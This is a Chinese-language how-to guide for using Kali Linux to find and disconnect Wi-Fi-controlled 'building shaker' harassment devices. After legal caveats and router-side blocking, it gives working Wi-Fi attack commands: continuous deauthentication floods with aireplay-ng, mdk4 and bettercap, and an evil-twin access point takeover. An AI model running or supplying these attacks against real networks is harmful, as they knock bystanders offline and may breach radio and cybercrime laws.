# 震楼器拦截：Kali 下识别 Wi-Fi 并阻断联网控制链路

> 适用对象：**联网型 / 可远程控制**的震楼器（内置 Wi-Fi 模块、智能插座、4G 网关、云台摄像头等）。目标不是攻击邻居网络，而是切断该设备与厂商云 / App 之间的控制链路，让「远程开机」失效。
>
> 配套：[检测篇 · 手机磁力计定位](detection.md) · [返回 README](../README.md)

## 0. 法律与技术边界（先读）

- 仅限**自身合法权益受侵害、紧急止损、同步取证**的场景；发现设备归属不明时不要动手。
- 在中国大陆，擅自对他人无线网络发射干扰/取消认证帧，可能触犯《无线电管理条例》《网络安全法》《治安管理处罚法》，情节严重的涉《刑法》第 285/286 条。**优先选择第 4.1 节的「自家路由器侧」方案**，无线干扰手段只作为最后手段并尽量短时、定向、留痕。
- 不抓取、不保存与事件无关的通信内容；不接触、不移动对方设备。
- 4G/5G 直连版本不依赖 Wi-Fi，本篇手段对其无效（见第 6 节）。

## 1. 环境准备

| 项 | 要求 |
|---|---|
| 系统 | Kali Linux（物理机或带 USB 网卡直通的虚拟机） |
| 无线网卡 | 支持 **monitor mode + packet injection**：Atheros AR9271、RTL8812AU、MT7612U 等。笔记本内置 Intel 网卡通常**不能注入** |
| 工具 | `aircrack-ng` 套件、`mdk4`、`bettercap`、`iw`、`tshark`、`nmap`、`arp-scan`（Kali 默认多数已装） |
| 权限 | root |

```bash
# 确认网卡与支持的模式
iw dev
iw list | grep -A 8 "Supported interface modes"
```

## 2. 开启监听模式

```bash
sudo airmon-ng check kill          # 停掉会抢网卡的 NetworkManager/wpa_supplicant
sudo airmon-ng start wlan0         # 生成 wlan0mon
iw dev                             # 确认 wlan0mon 存在
```

5 GHz 目标需确认网卡支持对应信道；可在启动时指定信道：`sudo airmon-ng start wlan0 149`。

## 3. 发现：拿到 SSID 与 BSSID

```bash
# 全信道扫描，记录 BSSID / ESSID / 信道 / 加密方式 / 客户端数
sudo airodump-ng wlan0mon

# 锁定目标信道精扫并存盘（-w 生成 cap 取证文件）
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w case01 wlan0mon
```

判读要点：

| 特征 | 含义 |
|---|---|
| PWR 在 -30 ~ -50 dBm | 信号极强，设备就在附近（可用于粗定位） |
| SSID 为 `ESP_xxxx` / `Sonoff` / `Tuya` / `XM_` / 品牌名 / 随机串 / 出厂默认名 | 典型 IoT 模块 |
| 客户端数为 0 但持续发 beacon | 设备在等 App 下发指令 |
| 客户端反复掉线又自动重连 | 典型「断网自动回连」的受控设备 |
| 隐藏 SSID | 仍可从关联帧中还原 ESSID，继续观察即可 |

补充指纹：在自家网段内用 `nmap -sn 192.168.1.0/24`、`arp-scan --localnet` 拿 MAC，再查厂商 OUI：

```bash
grep -i aabbcc /usr/share/nmap/nmap-mac-prefixes
```

`tshark` 观察 DHCP 主机名、mDNS `_http._tcp`、MQTT 1883/8883、HTTP Host，可判断设备连的是哪家云，便于第 4.3 节做域名黑名单。

## 4. 阻断（由温和到强硬）

### 4.1 自家路由器侧（首选，合法且稳定）

- 路由器后台把该设备 MAC 加入**黑名单 / 禁止上网**（仅当设备原本接的是自家网络）。
- 开启 **AP 隔离**、关闭访客网络、关闭 WPS / UPnP，减少设备被远程拉起的通道。
- 上游网关做**域名黑名单 + 出站 IP 阻断**（厂商云域名），效果等同「设备在线但失控」，且完全不留无线干扰痕迹。

### 4.2 定向取消认证（deauth）

对该 AP 广播 deauth，会**把所有关联到它的客户端一起打下线**：

```bash
# 持续发送（0 = 不限次数，Ctrl-C 停止）
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# 只打某个客户端，更精准
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 只发 10 个包就停，减少干扰时长
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

`mdk4` 等价做法（按信道打全场，或用黑名单只打目标）：

```bash
sudo mdk4 wlan0mon d -c 6
sudo mdk4 wlan0mon d -c 6 -b blacklist.txt
```

`bettercap` 交互式：

```bash
sudo bettercap -iface wlan0mon
# 交互命令行内：
wifi.recon on
wifi.show
wifi.deauth AA:BB:CC:DD:EE:FF
```

### 4.3 同名 AP 诱导（evil twin）

伪造与目标同名的 AP 并更强信号，把设备吸引到自己这边，再在其上行做 DNS 黑洞，使设备无法连到厂商云。属于「接管链路」，**不要抓取设备内容**，用完立即关闭。

> 说明：WPA3 / 开启 802.11w（PMF）的网络对 deauth 免疫，表现为客户端毫无反应；此时改用 4.1 / 4.3 方案。

## 5. 验证

- 设备 App 显示**离线**；智能插座指示灯由常亮转为快闪重连。
- `airodump-ng` 中该 AP 的客户端数归零，或 STATION 反复出现 AUTH/DEAUTH 循环。
- 目标设备控制的震楼器停止启动（与噪声 dB 回落、[磁场读数回落](detection.md) 同步确认）。
- 记录：起止时间、BSSID / ESSID / 信道、CPU 型号、cap 文件名——作为取证材料。

## 6. 常见失败原因

| 现象 | 原因 | 对策 |
|---|---|---|
| 看不到目标 SSID | 目标在 5 GHz / 网卡不支持该信道 | 换双频网卡，指定信道扫描 |
| 一直打不掉客户端 | WPA3 / 802.11w PMF | 改用路由器侧或 evil twin |
| 掉线后立刻回来 | 设备有多 AP 漫游 / mesh | 逐个 BSSID 打，或改用域名黑洞 |
| 完全无效果 | 设备走 4G/5G，不依赖 Wi-Fi | 本篇手段无效（见下） |
| 距离太远打不到 | 发射功率不足 | 定向天线、靠近；勿长时间大功率干扰 |

**4G / 蓝牙（BLE）版本**：不经过 Wi-Fi，无法用上述手段阻断；BLE 广播式控制也没有可取消的「连接」。这类只能走物业 / 公安 / 生态环境部门 / 诉讼途径，切勿使用无线电干扰器（违法且会影响周边通信）。

## 7. 收尾

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

保留 `case01-01.cap` 等取证文件与操作时间线，其余临时文件清理。
